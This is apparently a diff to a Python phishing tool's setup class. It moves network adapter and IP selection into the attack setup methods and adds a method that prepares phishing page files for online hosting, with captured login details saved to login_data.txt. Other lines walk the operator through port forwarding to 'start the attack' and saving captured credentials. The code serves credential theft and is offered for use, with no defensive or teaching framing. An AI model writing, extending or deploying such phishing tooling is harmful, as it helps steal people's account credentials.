@@ -16,12 +16,14 @@ class PhishSetup:
     def __init__(self):
         self.phishcreate = PhishCreate()
         self.sources = Sources()
-        self.wireless_adaptor = self.sources.selectadapter()
-        self.ip_address = self.sources.get_ip_address(self.wireless_adaptor) 
+        
 
     def setup_within_network(self):
         try:
             os.system("clear")
+            self.wireless_adaptor = self.sources.selectadapter()
+            self.ip_address = self.sources.get_ip_address(self.wireless_adaptor)
+            os.system("clear") 
             self.phishcreate.setup_phish_page()
             self.start_server()
             os.system("clear")
@@ -46,6 +48,9 @@ class PhishSetup:
 
     def setup_with_port_forwarding(self):
         try:
+            os.system("clear")
+            self.wireless_adaptor = self.sources.selectadapter()
+            self.ip_address = self.sources.get_ip_address(self.wireless_adaptor) 
             os.system("clear")
             print(f"{BLUE}[!] Place your internal IP address={self.ip_address} and Port=80 for port forwarding in router setting.........\n")
             check_port_forwarding = input(f"{GREEN}[?] After port forwarding in router setting, press 'y' to start the attack --> {RESET}")
@@ -202,6 +207,23 @@ class PhishSetup:
             if self.phishcreate.login_data_file_path != "":
                 self.sources.saving_captured(self.phishcreate.login_data_file_path)
             self.stop_server()
+
+    def setup_files_for_online_hosting(self):
+        try:
+            os.system("clear")
+            self.phishcreate.setup_phish_page()
+            os.system("clear")
+            output_path = self.phishcreate.main_url.split("/")[:-1]
+            output_path = "/".join(output_path)
+            print(f"[+] Your Files are ready in {GREEN}Directory{RESET}={BLUE}{output_path}{RESET}")
+            print(f"{GREEN} Login Details will be saved in{RESET} {BLUE}login_data.txt{RESET}")
+            check = input("[+] Press any key to exit --> ")
+        except KeyboardInterrupt:
+            pass
+        except Exception as e:
+            print(f"{RED}\n[-] Following error occur:-->{RESET}")
+            time.sleep(4)
+            pass
 
 
 
